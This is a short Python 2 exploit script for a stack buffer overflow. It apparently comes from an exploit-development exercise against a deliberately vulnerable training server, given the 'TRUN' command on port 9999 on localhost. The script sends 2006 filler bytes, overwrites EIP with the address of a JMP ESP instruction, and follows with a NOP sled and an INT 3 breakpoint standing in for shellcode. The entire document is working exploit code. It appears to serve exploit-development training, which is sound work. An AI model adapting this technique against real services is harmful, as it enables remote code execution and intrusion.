import socket

distance_to_eip = 'A' * 2006
eip_overwrite = '\xaf\x11\x50\x62' #We point the eip to the address x62 50 11 AF which contains the instructions JMP ESP (FF E4)
nopsled = '\x90' * 16
brk = '\xcc' # This is an x86 instruction.  More info can be found https://x86.puri.sm/ looking at INT 3
padding = 'F' * (3000 - len(distance_to_eip) - len(eip_overwrite) - len(nopsled) - len(brk)) #should be 973 F's

shellcode_placeholder = nopsled + brk + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
s.recv(100)
s.send('TRUN .' + distance_to_eip + eip_overwrite + shellcode_placeholder)
print s.recv(100)
s.close()
